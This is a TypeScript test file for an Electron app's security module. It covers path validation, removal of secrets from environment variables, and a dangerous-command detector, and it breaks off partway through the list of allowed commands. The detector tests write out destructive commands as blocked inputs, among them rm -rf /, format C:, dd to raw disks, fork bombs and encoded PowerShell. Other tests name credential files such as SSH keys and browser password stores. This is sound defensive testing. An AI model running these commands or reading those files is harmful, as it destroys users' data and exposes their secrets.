/**
 * Comprehensive security tests for the Electron app's defence-in-depth layer.
 *
 * Tests are platform-aware: the main function tests run on the host OS (Windows
 * for this project), while regex-level tests validate macOS/Linux patterns
 * directly regardless of the test platform.
 *
 * Coverage targets:
 *  - Path validation: traversal, null bytes, UNC, 8.3 short names, device names,
 *    credential files, system dirs, filesystem root, legitimate paths
 *  - Env sanitisation: exact stripping, pattern stripping, safe var preservation
 *  - Command detection: rm, rd, PowerShell, format, dd, fork bombs, chmod,
 *    registry, encoded commands, and legitimate command allowlisting
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import * as path from 'path'
import * as os from 'os'

// ── Mock electron before importing the module under test ──────────────────────
vi.mock('electron', () => ({
  app: {
    getPath: vi.fn((name: string) => {
      if (name === 'userData') {
        return process.platform === 'win32'
          ? 'C:\\Users\\testuser\\AppData\\Roaming\\Coasty Desktop'
          : '/Users/testuser/Library/Application Support/Coasty Desktop'
      }
      return ''
    }),
  },
}))

import {
  validateFilePath,
  sanitizeChildEnv,
  checkDangerousCommand,
  assertFiniteNumber,
  assertIpcSender,
  CREDENTIAL_PATTERNS,
  SYSTEM_DIR_PATTERNS_WIN32,
  SYSTEM_DIR_PATTERNS_UNIX,
  DANGEROUS_COMMAND_PATTERNS,
} from './security'

const HOME = os.homedir()

// Helper: build absolute paths for the current platform
const homePath = (...segments: string[]) => path.join(HOME, ...segments)

// ═══════════════════════════════════════════════════════════════════════════════
// PATH VALIDATION
// ═══════════════════════════════════════════════════════════════════════════════

describe('validateFilePath', () => {

  // ── Basic input validation ────────────────────────────────────────────────

  describe('basic validation', () => {
    it('rejects empty string', () => {
      expect(validateFilePath('', 'read').allowed).toBe(false)
    })

    it('rejects null/undefined-like values', () => {
      expect(validateFilePath(null as any, 'read').allowed).toBe(false)
      expect(validateFilePath(undefined as any, 'read').allowed).toBe(false)
    })

    it('rejects paths with null bytes', () => {
      const result = validateFilePath('/safe/path\0../../etc/shadow', 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('null bytes')
    })

    it('rejects null byte in middle of normal path', () => {
      const result = validateFilePath(homePath('Documents', 'file\0.txt'), 'write')
      expect(result.allowed).toBe(false)
    })
  })

  // ── UNC / network path blocking ───────────────────────────────────────────

  describe('UNC paths (Windows)', () => {
    // On Windows, path.resolve('\\\\server\\share') gives '\\server\share'
    it('rejects UNC paths', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('\\\\evil-server\\share\\payload.exe', 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('Network')
    })

    it('rejects UNC paths with forward slashes', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('//evil-server/share/data', 'read')
      // path.resolve converts // to UNC on Windows
      expect(result.allowed).toBe(false)
    })
  })

  // ── Windows 8.3 short name bypass ─────────────────────────────────────────

  describe('Windows 8.3 short names', () => {
    it('blocks PROGRA~1 as Program Files bypass', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\PROGRA~1\\something\\file.dll', 'write')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('8.3 short name')
    })

    it('blocks PROGRA~2 as Program Files (x86) bypass', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\PROGRA~2\\app\\config.ini', 'delete')
      expect(result.allowed).toBe(false)
    })

    it('allows reading from short name paths (read is OK for system dirs)', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\PROGRA~1\\app\\readme.txt', 'read')
      // Short name system dirs are only blocked for write/delete
      expect(result.allowed).toBe(true)
    })
  })

  // ── Windows reserved device names ─────────────────────────────────────────

  describe('Windows device names', () => {
    it.each([
      'CON', 'PRN', 'AUX', 'NUL',
      'COM1', 'COM2', 'COM9',
      'LPT1', 'LPT2', 'LPT9',
    ])('blocks writing to device name: %s', (device) => {
      if (process.platform !== 'win32') return
      const result = validateFilePath(homePath(device), 'write')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('reserved device name')
    })

    it('blocks device name with extension (NUL.txt)', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath(homePath('NUL.txt'), 'write')
      expect(result.allowed).toBe(false)
    })

    it('blocks device name case-insensitively (con, Nul, coM3)', () => {
      if (process.platform !== 'win32') return
      expect(validateFilePath(homePath('con'), 'write').allowed).toBe(false)
      expect(validateFilePath(homePath('Nul'), 'write').allowed).toBe(false)
      expect(validateFilePath(homePath('coM3'), 'write').allowed).toBe(false)
    })

    it('allows reading device names (harmless)', () => {
      if (process.platform !== 'win32') return
      // Reading CON just reads from console — not dangerous
      const result = validateFilePath(homePath('CON'), 'read')
      expect(result.allowed).toBe(true)
    })

    it('does NOT block words that contain device names', () => {
      if (process.platform !== 'win32') return
      // "CONSOLE.log" starts with CON but is not the device name
      const result = validateFilePath(homePath('CONSOLE.log'), 'write')
      expect(result.allowed).toBe(true)
    })

    it('does NOT block files named COM10+', () => {
      if (process.platform !== 'win32') return
      // COM10 is NOT a reserved device name (only COM0-9)
      const result = validateFilePath(homePath('COM10'), 'write')
      expect(result.allowed).toBe(true)
    })
  })

  // ── App credential protection ─────────────────────────────────────────────

  describe('app credential files', () => {
    it('blocks reading .session file', () => {
      const sessionPath = process.platform === 'win32'
        ? 'C:\\Users\\testuser\\AppData\\Roaming\\Coasty Desktop\\.session'
        : '/Users/testuser/Library/Application Support/Coasty Desktop/.session'
      const result = validateFilePath(sessionPath, 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('internal app credential')
    })

    it('blocks writing approval-config.json', () => {
      const configPath = process.platform === 'win32'
        ? 'C:\\Users\\testuser\\AppData\\Roaming\\Coasty Desktop\\approval-config.json'
        : '/Users/testuser/Library/Application Support/Coasty Desktop/approval-config.json'
      const result = validateFilePath(configPath, 'write')
      expect(result.allowed).toBe(false)
    })

    it('blocks deleting .session file', () => {
      const sessionPath = process.platform === 'win32'
        ? 'C:\\Users\\testuser\\AppData\\Roaming\\Coasty Desktop\\.session'
        : '/Users/testuser/Library/Application Support/Coasty Desktop/.session'
      const result = validateFilePath(sessionPath, 'delete')
      expect(result.allowed).toBe(false)
    })

    it('allows other files in userData directory', () => {
      const otherPath = process.platform === 'win32'
        ? 'C:\\Users\\testuser\\AppData\\Roaming\\Coasty Desktop\\logs.txt'
        : '/Users/testuser/Library/Application Support/Coasty Desktop/logs.txt'
      const result = validateFilePath(otherPath, 'read')
      expect(result.allowed).toBe(true)
    })
  })

  // ── Credential file protection ────────────────────────────────────────────

  describe('credential files', () => {
    it('blocks SSH private key (id_rsa)', () => {
      const result = validateFilePath(homePath('.ssh', 'id_rsa'), 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('SSH key')
    })

    it('blocks SSH private key (id_ed25519)', () => {
      const result = validateFilePath(homePath('.ssh', 'id_ed25519'), 'read')
      expect(result.allowed).toBe(false)
    })

    it('blocks SSH PEM file', () => {
      const result = validateFilePath(homePath('.ssh', 'my-server.pem'), 'read')
      expect(result.allowed).toBe(false)
    })

    it('blocks SSH config', () => {
      const result = validateFilePath(homePath('.ssh', 'config'), 'read')
      expect(result.allowed).toBe(false)
    })

    it('blocks SSH authorized_keys', () => {
      const result = validateFilePath(homePath('.ssh', 'authorized_keys'), 'write')
      expect(result.allowed).toBe(false)
    })

    it('blocks .gnupg directory contents', () => {
      const result = validateFilePath(homePath('.gnupg', 'secring.gpg'), 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('GPG')
    })

    it('blocks AWS credentials', () => {
      const result = validateFilePath(homePath('.aws', 'credentials'), 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('AWS')
    })

    it('blocks Azure access tokens', () => {
      const result = validateFilePath(homePath('.azure', 'accessTokens.json'), 'read')
      expect(result.allowed).toBe(false)
    })

    it('blocks GCP credentials', () => {
      const result = validateFilePath(homePath('.config', 'gcloud', 'credentials.db'), 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('GCP')
    })

    it('blocks GCP application default credentials', () => {
      const result = validateFilePath(
        homePath('.config', 'gcloud', 'application_default_credentials.json'), 'read',
      )
      expect(result.allowed).toBe(false)
    })

    it('blocks Docker config', () => {
      const result = validateFilePath(homePath('.docker', 'config.json'), 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('Docker')
    })

    it('blocks Kubernetes config', () => {
      const result = validateFilePath(homePath('.kube', 'config'), 'read')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('Kubernetes')
    })

    it('blocks .netrc', () => {
      expect(validateFilePath(homePath('.netrc'), 'read').allowed).toBe(false)
    })

    it('blocks .npmrc', () => {
      expect(validateFilePath(homePath('.npmrc'), 'read').allowed).toBe(false)
    })

    it('blocks .pypirc', () => {
      expect(validateFilePath(homePath('.pypirc'), 'read').allowed).toBe(false)
    })

    it('blocks .git-credentials', () => {
      expect(validateFilePath(homePath('.git-credentials'), 'read').allowed).toBe(false)
    })

    it('blocks RubyGems credentials', () => {
      expect(validateFilePath(homePath('.gem', 'credentials'), 'read').allowed).toBe(false)
    })

    it('allows .ssh/known_hosts (not a private key)', () => {
      const result = validateFilePath(homePath('.ssh', 'known_hosts'), 'read')
      expect(result.allowed).toBe(true)
    })

    it('allows .aws/config (not the credentials file)', () => {
      const result = validateFilePath(homePath('.aws', 'config'), 'read')
      expect(result.allowed).toBe(true)
    })

    it('allows .docker/daemon.json (not the auth config)', () => {
      const result = validateFilePath(homePath('.docker', 'daemon.json'), 'read')
      expect(result.allowed).toBe(true)
    })
  })

  // ── Credential patterns: cross-platform regex tests ───────────────────────

  describe('credential pattern coverage (regex-level)', () => {
    it('matches macOS Keychain path', () => {
      const match = CREDENTIAL_PATTERNS.find(p => p.label.includes('macOS Keychain'))
      expect(match).toBeDefined()
      expect(match!.pattern.test('/Library/Keychains/login.keychain-db')).toBe(true)
    })

    it('matches Chrome Login Data on macOS', () => {
      const match = CREDENTIAL_PATTERNS.find(p => p.label === 'browser password database')
      expect(match).toBeDefined()
      expect(match!.pattern.test(
        '/Library/Application Support/Google/Chrome/Default/Login Data',
      )).toBe(true)
    })

    it('matches Firefox logins.json', () => {
      const match = CREDENTIAL_PATTERNS.find(p => p.label.includes('Firefox'))
      expect(match).toBeDefined()
      expect(match!.pattern.test('/.mozilla/firefox/abc123.default/logins.json')).toBe(true)
    })

    it('matches Windows Credential Store', () => {
      const match = CREDENTIAL_PATTERNS.find(p => p.label === 'Windows Credential Store')
      expect(match).toBeDefined()
      expect(match!.pattern.test(
        '/AppData/Roaming/Microsoft/Credentials/DFBE70A1',
      )).toBe(true)
    })

    it('matches Windows Credential Vault', () => {
      const match = CREDENTIAL_PATTERNS.find(p => p.label === 'Windows Credential Vault')
      expect(match).toBeDefined()
      expect(match!.pattern.test(
        '/AppData/Local/Microsoft/Vault/4BF4C442',
      )).toBe(true)
    })

    it('matches AWS SSO cache', () => {
      const match = CREDENTIAL_PATTERNS.find(p => p.label === 'AWS SSO cache')
      expect(match).toBeDefined()
      expect(match!.pattern.test('/.aws/sso/cache/abc123.json')).toBe(true)
    })
  })

  // ── System directory protection ───────────────────────────────────────────

  describe('system directories (Windows)', () => {
    it('blocks writing to C:\\Windows\\...', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\Windows\\System32\\drivers\\etc\\hosts', 'write')
      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('Windows system directory')
    })

    it('blocks deleting from C:\\Program Files\\...', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\Program Files\\App\\file.dll', 'delete')
      expect(result.allowed).toBe(false)
    })

    it('blocks writing to C:\\Program Files (x86)\\...', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\Program Files (x86)\\App\\file.exe', 'write')
      expect(result.allowed).toBe(false)
    })

    it('blocks writing to C:\\ProgramData\\...', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\ProgramData\\secrets.ini', 'write')
      expect(result.allowed).toBe(false)
    })

    it('allows READING from system dirs (e.g. hosts file)', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\Windows\\System32\\drivers\\etc\\hosts', 'read')
      expect(result.allowed).toBe(true)
    })

    it('handles case variation: c:\\windows\\system32', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('c:\\windows\\system32\\cmd.exe', 'write')
      expect(result.allowed).toBe(false)
    })

    it('handles forward slashes: C:/Windows/System32', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:/Windows/System32/malware.dll', 'write')
      expect(result.allowed).toBe(false)
    })

    it('blocks writing to System Volume Information', () => {
      if (process.platform !== 'win32') return
      const result = validateFilePath('C:\\System Volume Information\\file', 'write')
      expect(result.allowed).toBe(false)
    })

    it('blocks writing/deleting the drive root C:\\', () => {
      if (process.platform !== 'win32') return
      expect(validateFilePath('C:\\', 'write').allowed).toBe(false)
      expect(validateFilePath('C:\\', 'delete').allowed).toBe(false)
    })

    it('allows reading from drive root', () => {
      if (process.platform !== 'win32') return
      expect(validateFilePath('C:\\', 'read').allowed).toBe(true)
    })
  })

  describe('system directories (Unix/macOS — regex-level)', () => {
    // Test the raw patterns since we might be running on Windows

    it.each([
      ['/boot/vmlinuz', 'boot'],
      ['/sbin/init', 'system binary'],
      ['/usr/sbin/sshd', 'system admin binary'],
      ['/usr/lib/libssl.so', 'system library'],
    ])('UNIX pattern blocks write to %s', (testPath, expectedLabel) => {
      const match = SYSTEM_DIR_PATTERNS_UNIX.find(p =>
        p.pattern.test(testPath) && p.label.toLowerCase().includes(expectedLabel),
      )
      expect(match).toBeDefined()
    })

    it('blocks /etc/shadow write', () => {
      const match = SYSTEM_DIR_PATTERNS_UNIX.find(p => p.pattern.test('/etc/shadow'))
      expect(match).toBeDefined()
      expect(match!.label).toContain('auth config')
    })

    it('blocks /etc/sudoers write', () => {
      const match = SYSTEM_DIR_PATTERNS_UNIX.find(p => p.pattern.test('/etc/sudoers'))
      expect(match).toBeDefined()
    })

    it('blocks macOS /System/ write', () => {
      const match = SYSTEM_DIR_PATTERNS_UNIX.find(p =>
        p.pattern.test('/System/Library/something'),
      )
      expect(match).toBeDefined()
      expect(match!.label).toContain('macOS System')
    })

    it('blocks /dev/ and /proc/ and /sys/', () => {
      expect(SYSTEM_DIR_PATTERNS_UNIX.some(p => p.pattern.test('/dev/sda'))).toBe(true)
      expect(SYSTEM_DIR_PATTERNS_UNIX.some(p => p.pattern.test('/proc/1/cmdline'))).toBe(true)
      expect(SYSTEM_DIR_PATTERNS_UNIX.some(p => p.pattern.test('/sys/class/net'))).toBe(true)
    })

    it('does NOT block /etc/hosts (allowed for read, and not in auth list)', () => {
      const authMatch = SYSTEM_DIR_PATTERNS_UNIX.find(p => p.pattern.test('/etc/hosts'))
      expect(authMatch).toBeUndefined()
    })
  })

  // ── Path traversal attacks ────────────────────────────────────────────────

  describe('path traversal', () => {
    it('normalises ../ before checking (traversal into system dir)', () => {
      if (process.platform !== 'win32') return
      // From user's home, traverse up to C:\Windows
      const malicious = homePath('..', '..', '..', 'Windows', 'System32', 'evil.dll')
      const result = validateFilePath(malicious, 'write')
      expect(result.allowed).toBe(false)
    })

    it('normalises mixed ../ and ./ segments', () => {
      const p = homePath('Documents', '..', '.ssh', 'id_rsa')
      const result = validateFilePath(p, 'read')
      expect(result.allowed).toBe(false) // resolves to ~/.ssh/id_rsa
    })
  })

  // ── Legitimate paths that MUST be allowed ─────────────────────────────────

  describe('allows legitimate paths', () => {
    it('allows reading/writing in home directory', () => {
      expect(validateFilePath(homePath('Documents', 'file.txt'), 'read').allowed).toBe(true)
      expect(validateFilePath(homePath('Documents', 'file.txt'), 'write').allowed).toBe(true)
    })

    it('allows Desktop', () => {
      expect(validateFilePath(homePath('Desktop', 'todo.md'), 'write').allowed).toBe(true)
    })

    it('allows Downloads', () => {
      expect(validateFilePath(homePath('Downloads', 'report.pdf'), 'read').allowed).toBe(true)
    })

    it('allows project directories', () => {
      expect(validateFilePath(homePath('projects', 'myapp', 'src', 'index.ts'), 'write').allowed).toBe(true)
    })

    it('allows deleting files in user workspace', () => {
      expect(validateFilePath(homePath('projects', 'myapp', 'node_modules', '.cache'), 'delete').allowed).toBe(true)
    })

    it('allows temp directory', () => {
      const tmp = os.tmpdir()
      expect(validateFilePath(path.join(tmp, 'coasty-temp.json'), 'write').allowed).toBe(true)
    })

    it('allows deeply nested project paths', () => {
      const deep = homePath('code', 'org', 'repo', 'packages', 'core', 'src', 'utils', 'helper.ts')
      expect(validateFilePath(deep, 'write').allowed).toBe(true)
    })

    it('allows .env files in project dirs (not credential files)', () => {
      expect(validateFilePath(homePath('projects', 'myapp', '.env'), 'read').allowed).toBe(true)
      expect(validateFilePath(homePath('projects', 'myapp', '.env.local'), 'write').allowed).toBe(true)
    })

    it('allows .ssh directory listing (known_hosts is fine)', () => {
      expect(validateFilePath(homePath('.ssh', 'known_hosts'), 'read').allowed).toBe(true)
    })
  })
})


// ═══════════════════════════════════════════════════════════════════════════════
// ENVIRONMENT SANITISATION
// ═══════════════════════════════════════════════════════════════════════════════

describe('sanitizeChildEnv', () => {
  const originalEnv = process.env

  beforeEach(() => {
    // Build a controlled env for testing
    process.env = {
      PATH: '/usr/bin:/usr/local/bin',
      HOME: '/Users/testuser',
      USER: 'testuser',
      SHELL: '/bin/bash',
      TERM: 'xterm-256color',
      NODE_ENV: 'development',
      GOPATH: '/Users/testuser/go',
      // App secrets that should be stripped
      INTERNAL_API_KEY: 'secret-internal-key',
      CSRF_SECRET: 'csrf-secret-value',
      ENCRYPTION_KEY: 'enc-key-value',
      SUPABASE_SERVICE_ROLE: 'supabase-service-key',
      STRIPE_API_KEY: 'sk_live_xxx',
      STRIPE_WEBHOOK_SECRET: 'whsec_xxx',
      STRIPE_PRICE_STARTER: 'price_xxx',
      POSTHOG_API_KEY: 'phc_xxx',
      NEXT_PUBLIC_SUPABASE_ANON_KEY: 'anon-key',
      GOOGLE_SEARCH_KEY: 'AIzaSy_xxx',
      // Pattern-matched secrets
      SUPABASE_CUSTOM_SECRET_KEY: 'custom-secret',
      STRIPE_NEW_WEBHOOK_TOKEN: 'new-webhook',
      COASTY_INTERNAL_SECRET: 'coasty-secret',
      COASTY_API_KEY: 'coasty-key',
      COASTY_AUTH_TOKEN: 'coasty-token',
      // User's own env vars that MUST be preserved
      AWS_ACCESS_KEY_ID: 'AKIA_user_key',
      AWS_SECRET_ACCESS_KEY: 'user_secret',
      DATABASE_URL: 'postgres://localhost/mydb',
      CUSTOM_APP_VAR: 'custom-value',
    }
  })

  afterAll(() => {
    process.env = originalEnv
  })

  it('strips INTERNAL_API_KEY', () => {
    const env = sanitizeChildEnv()
    expect(env.INTERNAL_API_KEY).toBeUndefined()
  })

  it('strips CSRF_SECRET', () => {
    const env = sanitizeChildEnv()
    expect(env.CSRF_SECRET).toBeUndefined()
  })

  it('strips ENCRYPTION_KEY', () => {
    const env = sanitizeChildEnv()
    expect(env.ENCRYPTION_KEY).toBeUndefined()
  })

  it('strips all Stripe keys', () => {
    const env = sanitizeChildEnv()
    expect(env.STRIPE_API_KEY).toBeUndefined()
    expect(env.STRIPE_WEBHOOK_SECRET).toBeUndefined()
    expect(env.STRIPE_PRICE_STARTER).toBeUndefined()
  })

  it('strips SUPABASE_SERVICE_ROLE', () => {
    const env = sanitizeChildEnv()
    expect(env.SUPABASE_SERVICE_ROLE).toBeUndefined()
  })

  it('strips POSTHOG_API_KEY', () => {
    const env = sanitizeChildEnv()
    expect(env.POSTHOG_API_KEY).toBeUndefined()
  })

  it('strips GOOGLE_SEARCH_KEY', () => {
    const env = sanitizeChildEnv()
    expect(env.GOOGLE_SEARCH_KEY).toBeUndefined()
  })

  it('strips pattern-matched Supabase secrets', () => {
    const env = sanitizeChildEnv()
    expect(env.SUPABASE_CUSTOM_SECRET_KEY).toBeUndefined()
  })

  it('strips pattern-matched Stripe webhook variants', () => {
    const env = sanitizeChildEnv()
    expect(env.STRIPE_NEW_WEBHOOK_TOKEN).toBeUndefined()
  })

  it('strips pattern-matched Coasty secrets', () => {
    const env = sanitizeChildEnv()
    expect(env.COASTY_INTERNAL_SECRET).toBeUndefined()
    expect(env.COASTY_API_KEY).toBeUndefined()
    expect(env.COASTY_AUTH_TOKEN).toBeUndefined()
  })

  it('preserves PATH', () => {
    const env = sanitizeChildEnv()
    expect(env.PATH).toBe('/usr/bin:/usr/local/bin')
  })

  it('preserves HOME', () => {
    const env = sanitizeChildEnv()
    expect(env.HOME).toBe('/Users/testuser')
  })

  it('preserves USER', () => {
    const env = sanitizeChildEnv()
    expect(env.USER).toBe('testuser')
  })

  it('preserves SHELL', () => {
    const env = sanitizeChildEnv()
    expect(env.SHELL).toBe('/bin/bash')
  })

  it('preserves NODE_ENV', () => {
    const env = sanitizeChildEnv()
    expect(env.NODE_ENV).toBe('development')
  })

  it('preserves GOPATH', () => {
    const env = sanitizeChildEnv()
    expect(env.GOPATH).toBe('/Users/testuser/go')
  })

  it('preserves user AWS credentials (agent may need them)', () => {
    const env = sanitizeChildEnv()
    expect(env.AWS_ACCESS_KEY_ID).toBe('AKIA_user_key')
    expect(env.AWS_SECRET_ACCESS_KEY).toBe('user_secret')
  })

  it('preserves user DATABASE_URL', () => {
    const env = sanitizeChildEnv()
    expect(env.DATABASE_URL).toBe('postgres://localhost/mydb')
  })

  it('preserves unknown user vars', () => {
    const env = sanitizeChildEnv()
    expect(env.CUSTOM_APP_VAR).toBe('custom-value')
  })

  it('does not mutate process.env', () => {
    sanitizeChildEnv()
    expect(process.env.INTERNAL_API_KEY).toBe('secret-internal-key')
  })
})

// We need afterAll to be available
const afterAll = (await import('vitest')).afterAll


// ═══════════════════════════════════════════════════════════════════════════════
// DANGEROUS COMMAND DETECTION
// ═══════════════════════════════════════════════════════════════════════════════

describe('checkDangerousCommand', () => {

  // ── Non-blocking edge cases ───────────────────────────────────────────────

  describe('does not block on invalid input', () => {
    it('returns not blocked for empty string', () => {
      expect(checkDangerousCommand('').blocked).toBe(false)
    })

    it('returns not blocked for null', () => {
      expect(checkDangerousCommand(null as any).blocked).toBe(false)
    })

    it('returns not blocked for undefined', () => {
      expect(checkDangerousCommand(undefined as any).blocked).toBe(false)
    })
  })

  // ── Unix rm variants ──────────────────────────────────────────────────────

  describe('blocks rm -rf / variants', () => {
    it.each([
      'rm -rf /',
      'rm -rf  /',
      'rm -Rf /',
      'rm -fr /',
      'rm -r -f /',
      'sudo rm -rf /',
      'doas rm -rf /',
    ])('blocks: %s', (cmd) => {
      expect(checkDangerousCommand(cmd).blocked).toBe(true)
    })

    it('blocks rm -rf /*', () => {
      expect(checkDangerousCommand('rm -rf /*').blocked).toBe(true)
    })

    it('blocks rm -rf ~', () => {
      expect(checkDangerousCommand('rm -rf ~').blocked).toBe(true)
    })

    it('blocks rm -rf ~/', () => {
      expect(checkDangerousCommand('rm -rf ~/').blocked).toBe(true)
    })

    it('does NOT block rm -rf /tmp/something', () => {
      expect(checkDangerousCommand('rm -rf /tmp/build-cache').blocked).toBe(false)
    })

    it('does NOT block rm -rf ~/node_modules', () => {
      expect(checkDangerousCommand('rm -rf ~/projects/app/node_modules').blocked).toBe(false)
    })

    it('does NOT block rm of a specific file', () => {
      expect(checkDangerousCommand('rm /tmp/old-file.log').blocked).toBe(false)
    })
  })

  // ── Windows cmd destruction ───────────────────────────────────────────────

  describe('blocks Windows cmd destruction', () => {
    it('blocks rd /s /q C:\\', () => {
      expect(checkDangerousCommand('rd /s /q C:\\').blocked).toBe(true)
    })

    it('blocks rmdir /s /q C:\\', () => {
      expect(checkDangerousCommand('rmdir /s /q C:\\').blocked).toBe(true)
    })

    it('blocks del /s C:\\', () => {
      expect(checkDangerousCommand('del /s C:\\').blocked).toBe(true)
    })

    it('blocks format C:', () => {
      expect(checkDangerousCommand('format C:').blocked).toBe(true)
    })

    it('blocks format D: (any drive)', () => {
      expect(checkDangerousCommand('format D:').blocked).toBe(true)
    })

    it('does NOT block rd of a specific directory', () => {
      expect(checkDangerousCommand('rd /s /q C:\\Users\\test\\temp').blocked).toBe(false)
    })
  })

  // ── PowerShell destruction ────────────────────────────────────────────────

  describe('blocks PowerShell destruction', () => {
    it('blocks Remove-Item C:\\ -Recurse -Force', () => {
      expect(checkDangerousCommand('Remove-Item C:\\ -Recurse -Force').blocked).toBe(true)
    })

    it('blocks Remove-Item -Recurse -Force C:\\', () => {
      expect(checkDangerousCommand('Remove-Item -Recurse -Force C:\\').blocked).toBe(true)
    })

    it('blocks Remove-Item -Path "C:\\" -Recurse', () => {
      expect(checkDangerousCommand('Remove-Item -Path "C:\\" -Recurse').blocked).toBe(true)
    })

    it('blocks Format-Volume', () => {
      expect(checkDangerousCommand('Format-Volume -DriveLetter C').blocked).toBe(true)
    })

    it('blocks Clear-Disk', () => {
      expect(checkDangerousCommand('Clear-Disk -Number 0 -RemoveData').blocked).toBe(true)
    })

    it('blocks encoded PowerShell (-enc)', () => {
      expect(checkDangerousCommand(
        'powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtAA==',
      ).blocked).toBe(true)
    })

    it('blocks encoded PowerShell (-EncodedCommand)', () => {
      expect(checkDangerousCommand(
        'powershell.exe -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtAA==',
      ).blocked).toBe(true)
    })

    it('blocks pwsh -enc (PowerShell Core)', () => {
      expect(checkDangerousCommand(
        'pwsh -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtAA==',
      ).blocked).toBe(true)
    })

    it('does NOT block Remove-Item on a specific path', () => {
      expect(checkDangerousCommand(
        'Remove-Item -Path "C:\\Users\\test\\temp" -Recurse',
      ).blocked).toBe(false)
    })

    it('does NOT block Get-ChildItem (read-only)', () => {
      expect(checkDangerousCommand('Get-ChildItem C:\\').blocked).toBe(false)
    })
  })

  // ── Disk operations ───────────────────────────────────────────────────────

  describe('blocks disk operations', () => {
    it('blocks mkfs', () => {
      expect(checkDangerousCommand('mkfs.ext4 /dev/sda1').blocked).toBe(true)
    })

    it('blocks mkfs.xfs', () => {
      expect(checkDangerousCommand('mkfs.xfs /dev/nvme0n1p1').blocked).toBe(true)
    })

    it('blocks dd to /dev/sda', () => {
      expect(checkDangerousCommand('dd if=/dev/zero of=/dev/sda bs=1M').blocked).toBe(true)
    })

    it('blocks dd to /dev/hda', () => {
      expect(checkDangerousCommand('dd if=image.iso of=/dev/hda').blocked).toBe(true)
    })

    it('blocks dd to Windows PhysicalDrive', () => {
      expect(checkDangerousCommand(
        'dd if=image.iso of=\\\\.\\PhysicalDrive0',
      ).blocked).toBe(true)
    })

    it('does NOT block dd to a file', () => {
      expect(checkDangerousCommand('dd if=/dev/zero of=/tmp/testfile bs=1M count=10').blocked).toBe(false)
    })
  })

  // ── Fork bombs ────────────────────────────────────────────────────────────

  describe('blocks fork bombs', () => {
    it('blocks bash fork bomb :(){ :|:& };:', () => {
      expect(checkDangerousCommand(':(){ :|:& };:').blocked).toBe(true)
    })

    it('blocks Windows fork bomb %0|%0', () => {
      expect(checkDangerousCommand('%0|%0').blocked).toBe(true)
    })
  })

  // ── Permission/ownership nukes ────────────────────────────────────────────

  describe('blocks permission/ownership nukes', () => {
    it('blocks chmod -R 777 /', () => {
      expect(checkDangerousCommand('chmod -R 777 /').blocked).toBe(true)
    })

    it('blocks chmod 000 /', () => {
      expect(checkDangerousCommand('chmod 000 /').blocked).toBe(true)
    })

    it('blocks chown -R root:root /', () => {
      expect(checkDangerousCommand('chown -R root:root /').blocked).toBe(true)
    })

    it('does NOT block chmod on a specific file', () => {
      expect(checkDangerousCommand('chmod 644 /tmp/myfile.txt').blocked).toBe(false)
    })

    it('does NOT block chown on a specific dir', () => {
      expect(checkDangerousCommand('chown -R www-data:www-data /var/www/html').blocked).toBe(false)
    })
  })

  // ── Registry destruction ──────────────────────────────────────────────────

  describe('blocks registry destruction', () => {
    it('blocks reg delete HKLM\\...', () => {
      expect(checkDangerousCommand(
        'reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /f',
      ).blocked).toBe(true)
    })

    it('blocks reg delete HKEY_LOCAL_MACHINE\\...', () => {
      expect(checkDangerousCommand(
        'reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet /f',
      ).blocked).toBe(true)
    })

    it('does NOT block reg query (read-only)', () => {
      expect(checkDangerousCommand('reg query HKLM\\SOFTWARE\\Microsoft').blocked).toBe(false)
    })

    it('does NOT block reg delete HKCU (user registry, less dangerous)', () => {
      expect(checkDangerousCommand('reg delete HKCU\\Software\\TestApp /f').blocked).toBe(false)
    })
  })

  // ── Boot record operations ────────────────────────────────────────────────

  describe('blocks boot record operations', () => {
    it('blocks bootrec /fixmbr', () => {
      expect(checkDangerousCommand('bootrec /fixmbr').blocked).toBe(true)
    })
  })

  // ── Legitimate commands that MUST be allowed ──────────────────────────────

  describe('allows legitimate commands', () => {
    it.each([
      'npm install',
      'npm run build',
      'yarn add lodash',
      'git status',
      'git push origin main',
      'git commit -m "fix: something"',
      'python script.py',
      'python -m pytest tests/',
      'node server.js',
      'cargo build --release',
      'go run main.go',
      'docker compose up -d',
      'kubectl get pods',
      'ls -la',
      'cat /etc/hosts',
      'echo "hello world"',
      'mkdir -p /tmp/my-build',
      'cp file1.txt file2.txt',
      'mv old.txt new.txt',
      'find . -name "*.ts" -type f',
      'grep -r "TODO" src/',
      'curl https://api.example.com/data',
      'wget https://example.com/file.zip',
      'tar xzf archive.tar.gz',
      'zip -r output.zip src/',
      'ssh user@server',
      'scp file.txt user@server:/tmp/',
      'rm -rf node_modules',
      'rm -rf /tmp/build-cache',
      'rm -rf ~/projects/old-app/dist',
      'Remove-Item -Path "C:\\Users\\test\\temp" -Recurse',
